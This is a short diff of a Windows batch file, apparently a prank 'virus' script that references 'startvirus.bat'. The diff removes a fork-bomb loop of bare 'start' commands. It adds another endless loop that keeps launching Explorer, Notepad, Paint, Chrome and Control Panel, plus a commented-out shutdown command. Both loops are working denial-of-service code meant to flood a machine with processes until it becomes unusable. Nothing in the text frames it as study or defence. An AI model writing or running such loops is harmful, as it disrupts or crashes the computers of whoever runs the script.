@@ -69,17 +69,11 @@ timeout 5 >nul
 exit /b
 md %random% | startvirus.bat
 @echo off
-:loop
-start
-start 
-start
-start
-start
-start
-start
-start
-start
-goto loop
-
-
-
+:x
+start explorer
+start notepad
+start mspaint
+start chrome
+start control
+goto x
+:shutdown /s /t 5
